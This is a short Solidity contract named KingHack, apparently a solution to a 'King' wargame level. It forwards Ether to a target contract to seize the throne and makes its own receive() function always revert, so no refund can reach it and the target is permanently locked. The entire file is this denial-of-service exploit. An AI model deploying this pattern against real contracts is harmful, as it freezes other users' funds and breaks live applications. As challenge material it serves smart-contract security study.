// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function _king() external view returns (address);
}

contract KingHack {
    function hack(address _to) public payable {
        (bool sent,) = _to.call{value: msg.value}("");
        require(sent, "KingHack: Failed to send Ether");
    }

    receive() external payable {
        revert("KingHack: receive() not allowed");
    }
}